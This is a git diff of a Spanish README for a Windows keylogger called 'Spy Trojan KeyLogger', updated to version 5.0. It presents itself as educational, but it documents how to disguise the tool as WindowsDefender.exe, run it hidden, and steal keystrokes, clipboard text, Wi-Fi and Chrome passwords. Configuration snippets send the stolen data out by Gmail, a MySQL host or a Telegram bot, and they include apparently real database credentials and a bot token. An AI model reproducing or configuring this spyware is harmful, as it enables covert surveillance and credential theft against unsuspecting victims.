@@ -1,13 +1,13 @@
 ````
 █▀ █▀█ █▄█   ▀█▀ █▀█ █▀█   █ ▄▀█ █▄ █   █▄▀ █▀▀ █▄█ █   █▀█ █▀▀ █▀▀ █▀▀ █▀█
-▄█ █▀▀  █     █  █▀▄ █▄█ █▄█ █▀█ █ ▀█   █ █ ██▄  █  █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v4.1.0     
+▄█ █▀▀  █     █  █▀▄ █▄█ █▄█ █▀█ █ ▀█   █ █ ██▄  █  █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v5.0    
 ````
 ---
 # ¡Por favor! úserla solo para fines educativos y con profesionalidad...
 ## Información
 * __Nombre:__ `Spy Trojan KeyLogger`
 * __Documentación:__ `28/05/2020`
-* __Versión:__ `4.1.0`
+* __Versión:__ `5.0`
 * __Estado:__` Estable`
 * __Plataforma:__` Windows 7, 8.1 y 10`
 * __Lenguaje:__` Python 3.8`
@@ -26,7 +26,7 @@ __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general,
 - `LICENCE` = Licencia 
 - `README.md`= Documentación
 - `version.txt` = Información detalla de conversión `.py` a `.exe`
-- `WindowsDefender.exe` = Keylogger Compilado `4.1.0`
+- `WindowsDefender.exe` = Keylogger Compilado `5.0`
 - `WindowsDefender.py` = Código fuente del Keylogger
 ---
 ---
@@ -43,21 +43,11 @@ __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general,
 - __Segundo Gmail en caso de Error:__ En casó el correo principal sea bloqueada o tenga x problemas, se usará un segundo correo.
 - __Recibe datos por varios correos:__ Hay una posibilidad de agregar 1 o más correos, y así el registro de teclas se envíe a varios correos a la vez.
 
-    ````py
-    #Correos que recibirán el registro de teclas.
-    def ReceiveE():
-        return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
-        #return ["CorreoReceptor@gmail.com"]                                         #Monocorreo        
-    ````
 - __Verifica conexión a internet:__ El keylogger verifica si la computadora está conectada a internet, y si ese es el caso envía los datos, en caso contrario, no lo envía,
 - __Intervalo de tiempo personalizado:__ 
     - __DATABASE:__ El tiempo recomendado es de 20 a 30 minutos.
-    - __GMAIL:__ El tiempo recomendado es de 1:30 a 2 horas mínimo. [`Sucede que Google suele bloquear la cuenta por horas cuando detecta una gran cantidad de correos envíados por día.`]
+    - __GMAIL:__ El tiempo recomendado es de 1:30 a 2 horas mínimo. [`Google suele bloquear la cuenta por horas cuando detecta una gran cantidad de correos envíados por día.`]
 
-    ````py
-    def timeSend(): # Tiempo de envío perzonalizado
-        return 120    # Minutos                 <= Escoja su tiempo en minutos
-    ````
 - __Envío del registro prueba de errores:__ En otros keylogger al momento de enviar el `reg.k`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene ninguna información de teclas oprimidas, en éste keylogger, ese error está solucionado.
 - __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, solo por detalles de debuggeo, pero al ser compilada de `*.py` a `*.exe` el ejecutable resultante se ejecutará en segundo plano
 
@@ -88,6 +78,8 @@ __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general,
 - __Contraseñas de Wifi:__ Obtiene contraseñas guardadas en una laptop o PC
 - __Portapapeles:__ Obtiene el texto del portapapeles.
 - __Obtiene contraseñas guardadas en Google Chrome:__ Obtiene todas las contraseñas guardadas de Google chrome .
+- __Capturas de pantalla:__ [No valido en base de datos]
+- __Auto Destrucción:__ El keylogger se auto destruirá en una una fecha especifica.
 
 ## Uso de Recursos de la PC
 El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
@@ -122,42 +114,32 @@ NOTA: Biblioteca no optimizada! :'(
 
 - Buscamos la siguiente función y escogemos [0 = Gmail], [1 = DataBase] o  [2 = BotTelegram]
     ````py
-    def SendMode():
-        return 2    # 0 = Gmail
-                    # 1 = DataBase              # Solo se puede usar una opción
-                    # 2 = TelegramBot
+    # Importante
+        self.TIMESEND = 5 #[minutos]                                                # Tiempo de envió del registro
+        self.MODE = 0     # 0 = Gmail
+                          # 1 = DataBase                                            # Solo se puede usar una opción
+                          # 2 = TelegramBot
     ```` 
 
 
 ## [Configuración] Gmail
 1. Es de suma urgencia habilitar el acceso a apps menos seguras de google, la cual lo puedes hacer desde éste [link](https://myaccount.google.com/lesssecureapps).  `En caso no lo habilites, el keylogger no podrá iniciar sesión en su Gmail`
-2. Use  `git clone https://github.com/SebastianEPH/SpyTrojan_Keylogger.git` para descargar el repositorio en su computadora.
 
-3. Abra el archivo `WindowsDefender.py` en su editor de texto.
-4. Entre al codigo y busca la `ZONA CUSTOM BÁSICA` y modifique el `Correo primario` y el `Correo segundario`, luego rellene el o los `Correos que receptores`
+2. Abra el archivo `WindowsDefender.py` en su editor de texto.
+
     ````py
-    # ************ Zona Gmail ************* 
-    def emailP():# Correo de envío [Primaria]                    
-        return "correo1@gmail.com"  # <<== Cambia éste correo
-    def passP():                    # <<== Contraseña del correo
-        return "contra1"
-    def emailS():# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
-        return "correo2@gmail.com"  # <<== Cambia éste correo
-    def passS():                   
-        return "pass2"              # <<== Contraseña del correo 
-
-    def ReceiveE():#Correos que recibirán el registro de teclas.
-        #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
-        return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
-    # ************ Fin Zona Gmail ************* 
-
-    def SendMode():
-        return 0    # 0 = Gmail
-                    # 1 = DataBase              # Solo se puede usar una opción
-                    # 2 = TelegramBot
-
-    def timeSend(): # Tiempo de envío perzonalizado
-        return 120 #Minutos                 <= Escoja su tiempo en minutos
+    class Gmail:
+        def __init__(self):
+            self.GMAIL_1 = "correo1@gmail.com"
+            self.PASS_1  = "password1"
+            self.GMAIL_2 = "correo2@gmail.com"
+            self.PASS_2  = "password2"
+            self.GMAIL_3 = "correo3@gmail.com"
+            self.PASS_3  = "password3"
+          # Solo un correo Recibirá el Registro de Teclas
+            self.RECEIVERS = ["receivers1@yahoo.com"]
+          # Correos que recibiran el Registro de teclas, pueden ser de 1 a muchos
+          # self.RECEIVERS = ["receivers1@yahoo.com","receivers2@gmail.com","receivers3@hotmail.com"]
     ````
 
 ## [Configuración] Database MySQL
@@ -209,26 +191,18 @@ NOTA: Biblioteca no optimizada! :'(
 10. Ahora entramos a nuestro archivo `WindowsDefender.py` y buscamos y colocamos los datos de tu base de datos:
 
     ````py
-    # ************ Start Zone DATABASE ************* 
-    def DB_HOST():
-        return "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"   # Host
-    def DB_USER():
-        return "udwlsyrbtldkznqo"                                       # Usuario de la base de datos
-    def DB_PASS():
-        return "OR2i2dfdgWek0UDiAv4f"                                   # Contraseña de la Base de Datos
-    def DB_NAME():
-        return "bh1g5gnxzw2igrvui8hq"                                   # Nombre de Base de datos
-    def DB_PORT(): 
-        return "3306"                                                   # Opcional en algunos casos
-
-    # ************ Fin Zone DATABASE ************* 
-    def SendMode():
-        return 1    # 0 = Gmail
-                    # 1 = DataBase              # Solo se puede usar una opción
-                    # 2 = TelegramBot
-
-    def timeSend(): # Tiempo de envío perzonalizado
-        return 10 #Minutos                 <= Escoja su tiempo en minutos
+         # Importante
+        self.TIMESEND = 26 #[minutos]                                                # Tiempo de envió del registro
+        self.MODE = 1     # 0 = Gmail
+                          # 1 = DataBase                                            # Solo se puede usar una opción
+                          # 2 = TelegramBot
+    class DataBase:  # Clase de Base de datos
+        def __init__(self):
+            self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
+            self.USERNAME = "udwlsyrbtldkznqo"                                      # Username
+            self.PASSWORD = "OR2i2dfdgWek0UDiAv4f"                                  # Password
+            self.DATABASE = "bh1g5gnxzw2igrvui8hq"                                  # DataBase Name
+            self.PORT     = "3306"                                                  # Port
     ````
 
 11. Si al ejecutar el keylogger todo salió bien, podemos ver en la base de datos el registro de teclas
@@ -253,20 +227,24 @@ NOTA: Biblioteca no optimizada! :'(
     
     ![CHAT ID](https://i.imgur.com/tJttP3i.png)
 
-5. Ya tenemos nuestro `Token del bot` y nuestro `Chat ID` ahora tenemos que abrir nuestro archivo `WindowsDefender.py` y colocar esos datos en las siguientes funciones:
+5. Ya tenemos nuestro `Token del bot` y nuestro `Chat ID` ahora tenemos que abrir nuestro archivo `WindowsDefender.py` y colocar esos datos siguientes métodos:
+
+    __NOTA:__ Podemos tener hasta 3 ID distintos y a todos les llegaran los mismos datos, si solo usará uno, no modifique los valores del ID_2 e ID_3
 
     ````py
-    def SendMode():
-    return 2    # 0 = Gmail
-                # 1 = DataBase              # Solo se puede usar una opción
-                # 2 = TelegramBot
-                
-    # ************ Zone Telegram *************     
-    def ID():
-        return 123456789            # <=  ID de chat telegram [Nota] no lo coloque entre comillas
+    # Importante
+        self.TIMESEND = 26 #[minutos]                                                # Tiempo de envió del registro
+        self.MODE = 2     # 0 = Gmail
+                          # 1 = DataBase                                            # Solo se puede usar una opción
+                          # 2 = TelegramBot
 
-    def Token():
-        return "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"    # Token del Bot del Telegram
+        class TelegramBot:
+        def __init__(self):
+            self.ID   = 831756903                                                     # ID Principal [Obligatorio]
+            self.ID_2 = 000000000                                                     # ID secundario [Opcional]
+            self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
+            self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"             # TOKEN de tu Bot [Obligatorio]
+
 
     # ************ Zona Telegram ************* 
     ````
@@ -342,6 +320,5 @@ __Nota:__ Contacteme solo si encontró un bug o desea aportar al repositorio, gr
 
 <!--- [Website](https://sebastianeph.github.io/) -->
 - [Github](https://github.com/SebastianEPH)
-- [Linkedin](https://www.linkedin.com/in/sebastianeph/)
-- [Telegram](https://t.me/sebastianeph)
+<!--- - [Telegram](https://t.me/sebastianeph) -->
 - [Facebook](https://www.facebook.com/SebastianEPH)
